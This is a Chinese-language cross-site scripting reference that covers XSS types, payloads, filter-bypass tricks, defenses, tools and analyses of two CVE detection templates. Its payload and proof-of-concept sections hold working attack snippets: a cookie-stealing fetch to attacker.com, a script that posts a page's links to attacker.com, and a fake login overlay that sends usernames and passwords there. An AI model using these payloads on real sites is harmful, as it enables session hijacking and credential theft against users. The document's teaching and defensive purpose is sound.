# 跨站脚本攻击 (XSS)

> 跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见于Web应用程序中的计算机安全漏洞。XSS允许攻击者向其他用户查看的网页中注入客户端脚本。

## 目录

- [方法论](#方法论)
- [概念验证](#概念验证)
    - [数据窃取](#数据窃取)
    - [CORS 问题](#cors-问题)
    - [界面伪装](#界面伪装)
- [XSS 类型](#xss-类型)
- [XSS 有效载荷](#xss-有效载荷)
- [绕过技术](#绕过技术)
- [防御措施](#防御措施)
- [工具](#工具)
- [学习资源](#学习资源)

## 什么是XSS？

跨站脚本攻击（XSS）是一种安全漏洞，攻击者能够将恶意脚本注入到其他用户会访问的网页中。当受害者访问被注入恶意脚本的页面时，这些脚本会在其浏览器中执行，可能导致会话劫持、钓鱼攻击或其他恶意活动。

## XSS 类型

### 1. 反射型 XSS (Reflected XSS)
- 恶意脚本来自当前HTTP请求
- 通常通过诱使用户点击特制链接触发
- 示例：`http://example.com/search?q=<script>alert(1)</script>`

### 2. 存储型 XSS (Stored XSS)
- 恶意脚本永久存储在目标服务器上
- 影响所有访问受影响页面的用户
- 常见于评论、论坛帖子、用户资料等

### 3. 基于DOM的 XSS (DOM-based XSS)
- 完全在客户端执行
- 由不安全的JavaScript操作DOM导致
- 示例：`document.write(location.hash.substring(1))`

## XSS 有效载荷

### 基本有效载荷
```html
<script>alert('XSS')</script>
<svg/onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
```

### 绕过过滤
```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<svg/onload=alert`1`>
<iframe src="javascript:alert('XSS')">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

### 窃取Cookie
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

## 概念验证

### 数据窃取
```html
<script>
  // 发送当前页面的所有链接到攻击者服务器
  var links = document.getElementsByTagName('a');
  var stolenData = '';
  for(var i=0; i<links.length; i++) {
    stolenData += links[i].href + '\n';
  }
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: stolenData
  });
</script>
```

### 界面伪装
```html
<!-- 覆盖整个页面显示虚假登录表单 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h1>请重新登录</h1>
  <form action="https://attacker.com/steal" method="POST">
    用户名: <input type="text" name="username"><br>
    密码: <input type="password" name="password"><br>
    <input type="submit" value="登录">
  </form>
</div>
```

## 绕过技术

### 大小写混淆
```html
<ScRiPt>alert('XSS')</ScRiPt>
```

### 使用HTML实体编码
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### 使用JavaScript伪协议
```html
<a href="javascript:alert('XSS')">点击我</a>
```

### 使用事件处理程序
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

## 防御措施

### 1. 输入验证
- 对用户输入进行严格验证
- 使用白名单而非黑名单
- 验证输入的数据类型、长度和格式

### 2. 输出编码
- 在显示用户提供的内容之前进行HTML实体编码
- 根据上下文使用适当的编码函数

### 3. 内容安全策略 (CSP)
```
Content-Security-Policy: default-src 'self'; script-src 'self' trusted.com;
```

### 4. HttpOnly 标志
- 设置Cookie时使用HttpOnly标志
- 防止JavaScript访问Cookie

### 5. 框架安全头
- 使用X-XSS-Protection头
- 使用X-Content-Type-Options: nosniff
- 使用X-Frame-Options: DENY

## 工具

- [XSS Hunter](https://xsshunter.com/) - 盲打XSS的利用框架
- [BeEF](https://beefproject.com/) - 浏览器利用框架
- [XSStrike](https://github.com/s0md3v/XSStrike) - 先进的XSS检测和利用工具
- [XSS'OR](https://github.com/evilcos/xssor2) - XSS构造和利用工具

## 学习资源

- [OWASP XSS 防御指南](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS 实验室](https://portswigger.net/web-security/cross-site-scripting)
- [XSS 过滤绕过备忘单](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HackerOne XSS 报告](https://hackerone.com/hacktivity?querystring=xss&order_direction=DESC&order_field=latest_disclosable_activity_at&filter=type%3Apublic)

## 免责声明

本文档仅用于教育目的。请勿将其用于非法活动。在进行安全测试时，请确保您已获得适当的授权。

* [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
* [OWASP - XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

---

## 八、典型漏洞 YAML 文件分析

本目录及上级目录收录了多个与 XSS（跨站脚本攻击）相关的漏洞利用模板，以下对部分典型 YAML 文件进行详细解读。

### 1. CVE-2021-32853.yaml (Erxes XSS)
- **漏洞类型**：反射型 XSS
- **漏洞原理**：
  Erxes 0.23.0 之前的版本中，`change-password` 功能的某个参数未经过充分的过滤和转义，就被直接嵌入到页面的 `<script>` 标签中。攻击者可以构造一个恶意的 URL，将 JavaScript payload 注入到这个参数中。当受害者点击此链接时，其浏览器会执行攻击者注入的脚本。
- **探测原理**：
  该模板向 `/auth/change-password` 接口发送一个 GET 请求，并在查询参数中注入一个典型的 XSS payload，如 `"><script>alert(document.domain)</script>`。如果服务器的响应中完整地包含了这个未转义的 payload，并且响应的 `Content-Type` 为 `text/html`，则判定漏洞存在。
- **修复建议**：升级 Erxes 至安全版本，并对所有输出到页面的用户数据进行严格的上下文感知转义。

### 2. CVE-2023-1719.yaml (Bitrix24 XSS)
- **漏洞类型**：反射型 XSS
- **漏洞原理**：
  Bitrix24 的某个组件在处理 `show_wizard` 参数时，未能正确过滤用户输入，直接将其内容输出到 HTML 页面中。攻击者可以注入恶意的 HTML 和 JavaScript 代码，当其他用户访问包含该恶意参数的 URL 时，浏览器会执行这些脚本。
- **探测原理**：
  该模板通过 GET 请求，在 `show_wizard` 参数中注入一个 `<img src=x onerror=alert(document.domain)>` 的 payload。这是一个经典的 XSS 探测向量，它创建了一个无效的图片标签，并利用 `onerror` 事件来执行 JavaScript。如果响应体中包含了这个 payload，则证明应用程序未能正确处理输入，存在 XSS 漏洞。
- **修复建议**：升级 Bitrix24 至最新版本，修复变量输出点的安全过滤问题。

---

#### 总结
XSS 漏洞的本质是"代码"与"数据"的混淆。当应用程序将用户提供的"数据"不加处理地当作"代码"（HTML/JavaScript）输出到浏览器时，XSS 漏洞就产生了。防御 XSS 的核心原则是：
- **输入过滤**：对用户输入进行校验，过滤掉不符合预期的内容。但这通常作为辅助手段。
- **输出转义**：这是防御 XSS 最关键的一步。根据数据输出的上下文（HTML 标签内、HTML 属性中、JavaScript 变量中等），对所有用户数据进行严格的、有针对性的转义。
- **内容安全策略 (CSP)**：通过设置 CSP HTTP 头部，可以限制浏览器能够加载和执行的脚本来源，作为纵深防御的重要一环。
